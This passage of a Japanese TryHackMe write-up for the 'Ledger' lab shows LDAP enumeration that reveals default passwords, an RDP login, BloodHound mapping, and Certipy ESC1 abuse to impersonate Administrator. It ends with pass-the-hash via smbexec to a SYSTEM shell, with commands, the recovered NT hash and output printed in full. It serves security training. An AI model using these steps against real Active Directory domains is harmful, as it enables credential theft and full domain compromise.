ldapsearch -x -H ldap://10.10.133.131  -D "SUSANNA_MCKNIGHT@THM.LOCAL" -w 'CHANGEME2023!' -b "DC=THM,DC=LOCAL" "(sAMAccountName=SUSANNA_MCKNIGHT)" 

<SNIP>
# SUSANNA_MCKNIGHT, Test, ITS, Tier 1, thm.local
dn: CN=SUSANNA_MCKNIGHT,OU=Test,OU=ITS,OU=Tier 1,DC=thm,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: SUSANNA_MCKNIGHT
sn: SUSANNA_MCKNIGHT
description: Please change it: CHANGEME2023!
distinguishedName: CN=SUSANNA_MCKNIGHT,OU=Test,OU=ITS,OU=Tier 1,DC=thm,DC=loca
 l
instanceType: 4
whenCreated: 20230530094650.0Z
whenChanged: 20250623133416.0Z
displayName: SUSANNA_MCKNIGHT
uSNCreated: 108350
memberOf: CN=Remote Management Users,CN=Builtin,DC=thm,DC=local
memberOf: CN=Remote Desktop Users,CN=Builtin,DC=thm,DC=local
uSNChanged: 163924
name: SUSANNA_MCKNIGHT
objectGUID:: BjQ7dN/wMEC8mqIWQ5XnmA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133637143479762329
lastLogoff: 0
lastLogon: 133637352038541477
pwdLastSet: 133330434928772215
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAwwUAAA==
accountExpires: 9223372036854775807
logonCount: 12
sAMAccountName: SUSANNA_MCKNIGHT
sAMAccountType: 805306368
userPrincipalName: SUSANNA_MCKNIGHT@thm.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=thm,DC=local
dSCorePropagationData: 20230705144401.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 133951592564859878

# search reference
ref: ldap://ForestDnsZones.thm.local/DC=ForestDnsZones,DC=thm,DC=local

# search reference
ref: ldap://DomainDnsZones.thm.local/DC=DomainDnsZones,DC=thm,DC=local

# search reference
ref: ldap://thm.local/CN=Configuration,DC=thm,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

```


**IVY_WILLIS**
- 特に目立った情報なさそう？
```sh
ldapsearch -x -H ldap://10.10.133.131  -D "IVY_WILLIS@THM.LOCAL" -w 'CHANGEME2023!' -b "DC=THM,DC=LOCAL" "(sAMAccountName=IVY_WILLIS)"

<SNIP>
# IVY_WILLIS, HRE, Tier 1, thm.local
dn: CN=IVY_WILLIS,OU=HRE,OU=Tier 1,DC=thm,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: IVY_WILLIS
sn: IVY_WILLIS
description: Please change it: CHANGEME2023!
distinguishedName: CN=IVY_WILLIS,OU=HRE,OU=Tier 1,DC=thm,DC=local
instanceType: 4
whenCreated: 20230530094649.0Z
whenChanged: 20250623133449.0Z
displayName: IVY_WILLIS
uSNCreated: 108287
uSNChanged: 163925
name: IVY_WILLIS
objectGUID:: KBl6upWIek++Xz3I5NMaRQ==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133299234558943766
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAugUAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: IVY_WILLIS
sAMAccountType: 805306368
userPrincipalName: IVY_WILLIS@thm.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=thm,DC=local
dSCorePropagationData: 20230705144401.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 133951592891891724

# search reference
ref: ldap://ForestDnsZones.thm.local/DC=ForestDnsZones,DC=thm,DC=local

# search reference
ref: ldap://DomainDnsZones.thm.local/DC=DomainDnsZones,DC=thm,DC=local

# search reference
ref: ldap://thm.local/CN=Configuration,DC=thm,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

```


## RDP
SUSANNA_MCKNIGHTで、RDPで接続する
```sh
xfreerdp /u:SUSANNA_MCKNIGHT /p:CHANGEME2023! /v:10.10.133.131 /cert:ignore  
```


user.txtの取得
![](https://i.imgur.com/AvQ9ESK.png)





# Privilege Escalation


## BloodHound
```bash
└─$ sudo bloodhound-python -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' -ns 10.10.133.131 -d THM.LOCAL -c all
[sudo] password for kali: 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: thm.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: labyrinth.thm.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: labyrinth.thm.local
INFO: Found 493 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 222 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: labyrinth.thm.local
INFO: Done in 01M 54S

```

SUSANNA_MCKNIGHTから、Reachable High Value Targetsの一番下のDCSyncに繋がる部分のルートで権限昇格していく
![](https://i.imgur.com/qQsu6WO.png)

`AZR@THM.LOCAL`に対して、[GenericWriteアクセス](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite)があるので、それを利用する
具体的には、AZRは、OUなので、以下の記事を参考にした攻撃を行う
　- https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory
	　- この記事では、[OUned.py](https://github.com/synacktiv/OUned/tree/master)を紹介している
使用しようと思ったが、ダミーのOUが必要だが、SUSANNA_MCKNIGHTでは、GPOを作成できないので、使用できない
```bash
PS C:\Users\SUSANNA_MCKNIGHT> New-GPO -Name "OUned_Dummy_GPO"
New-GPO : Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
At line:1 char:1
+ New-GPO -Name "OUned_Dummy_GPO"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [New-GPO], UnauthorizedAccessException
    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.GroupPolicy.Commands.NewGpoCommand
```

## Certpy
- Active Directory Certificate Services（AD CS）に対する攻撃や調査を行えるツール
	- AD CS：Active Directory Certificate Services。Windowsドメイン環境に証明書を発行・管理するサービス。
- Windowsドメイン環境で証明書ベースの権限昇格や認証回避などの脆弱性（たとえば ESC1〜ESC8）を検出・悪用するために使う
	- ESC1〜ESC8
		- 証明書関連の典型的な脆弱性パターン
		- たとえば ESC1 は「ユーザーが自分で証明書を要求でき、証明書で任意のユーザーを偽装できる」問題

実行すると、
labyrinth.thm.localに対して行うと、脆弱なESC1がある
- 「Authenticated Users（全認証済みユーザー）」がこのテンプレートを使用できるため、攻撃者も利用可能な可能性がある
- ESC1 により、攻撃者は任意のユーザーになりすまして証明書を取得し、ドメイン内での権限昇格が可能になる可能性がある
```bash
└─$ certipy-ad find -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -target labyrinth.thm.local -stdout -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: labyrinth.thm.local.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'thm-LABYRINTH-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'thm-LABYRINTH-CA'
[*] Checking web enrollment for CA 'thm-LABYRINTH-CA' @ 'labyrinth.thm.local'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : thm-LABYRINTH-CA
    DNS Name                            : labyrinth.thm.local
    Certificate Subject                 : CN=thm-LABYRINTH-CA, DC=thm, DC=local
    Certificate Serial Number           : 5225C02DD750EDB340E984BC75F09029
    Certificate Validity Start          : 2023-05-12 07:26:00+00:00
    Certificate Validity End            : 2028-05-12 07:35:59+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : THM.LOCAL\Administrators
      Access Rights
        ManageCa                        : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        ManageCertificates              : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Enroll                          : THM.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ServerAuth
    Display Name                        : ServerAuth
    Certificate Authorities             : thm-LABYRINTH-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-05-12T08:55:40+00:00
    Template Last Modified              : 2023-05-12T08:55:40+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : THM.LOCAL\Administrator
        Full Control Principals         : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Owner Principals          : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Property Enroll           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : THM.LOCAL\Domain Computers
                                          THM.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

そこで、ESC1 を使って、Administratorになりすます
- 成功して、administrator.pfxが取得できる
	- .pfxとは
		- 証明書と秘密鍵がセットになったファイル
		- Windows 環境でよく使われる形式で、正式には PKCS#12（.pfxまたは.p12）ファイルと呼ばれる
- この administrator.pfx を使うと、Administrator ユーザーになりすますことができる
	- できること
	- Kerberos 認証（TGTの取得）
	- NTLMハッシュの取得
		- smbexecやevil-winrmなどでのリモートシェルアクセス
- 証明書ベースの認証は、パスワードなしでログインできる手段の1つ

```bash
certipy-ad req -username 'SUSANNA_MCKNIGHT@thm.local' -password 'CHANGEME2023!' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn Administrator@thm.local


Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: labyrinth.thm.local.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: THM.LOCAL.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 24
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@thm.local'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```


NTLMハッシュの取得に成功
```bash
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.133.131
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@thm.local'
[*] Using principal: 'administrator@thm.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@thm.local': aad3b435b51404eeaad3b435b51404ee:07d677a6cf40925beb80ad6428752322

```

取得したNTLMハッシュで管理者権限を取得できた
```sh
└─$ smbexec.py -k -hashes aad3b435b51404eeaad3b435b51404ee:07d677a6cf40925beb80ad6428752322 THM.LOCAL/Administrator@labyrinth.thm.local
/home/kali/Desktop/THM/machine/Ledger/OUned/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
```

![](https://i.imgur.com/B9J5mLV.png)


# 参考
- https://jaxafed.github.io/posts/tryhackme-ledger/

# 詰まったポイント
- AS-REP Roastingで取得したハッシュが割れなくて、それ以外の足がかりがなくて詰まった

## Writeupから学んだこと
- ldapのdescriptionを注意してみるという意識
	- windowsに侵入してから、`whoami /groups`の Attributesとかは注意してみるようにしてたけど、
	- 確かに言われてみればldapのdescriptionも注意すべきだった
		- descriptionにパスワードやヒントが書いてあることは、これからも全然ありえそう
		- 今一度、注意して次から見ていく必要があると意識させられた
- nxc・certpyというツールについて
- nxc
	- ​ crackmapexecだとエラーになってできないことがnxcではできる
		- 正直、Descriptionに注目すること自体は、ldapでも十分できるが、みやすいのは大事
- certpy
	- そもそもAD CSが発行する証明書テンプレートの設定ミスを利用する攻撃手法を知らなかった
	- wiki : https://github.com/ly4k/Certipy/wiki
	- 対象にしているサービス
		- Active Directory Certificate Services
			- Microsoftのオンプレミス向けPKI（公開鍵基盤）ソリューション
			- Active Directory 環境内でのデジタル証明書の発行・管理を担っている
			- これらの証明書は、**ファイルの暗号化・デジタル署名・認証（スマートカードログオンやTLS/SSLなど）**といった重要な機能を支えている
			- AD CS は、ユーザーやコンピューターとしてアクセス可能な「**パスワード相当の証明書**」を発行できる
			- 証明機関（CA）の侵害や、証明書テンプレートの設定ミスは、ドメインコントローラーの侵害と同程度に深刻な影響を与える
				- 今回は、証明書テンプレートの設定ミス
	- ツールの概要
		- AD CS の設定ミスを列挙・識別・悪用するための総合ツールキット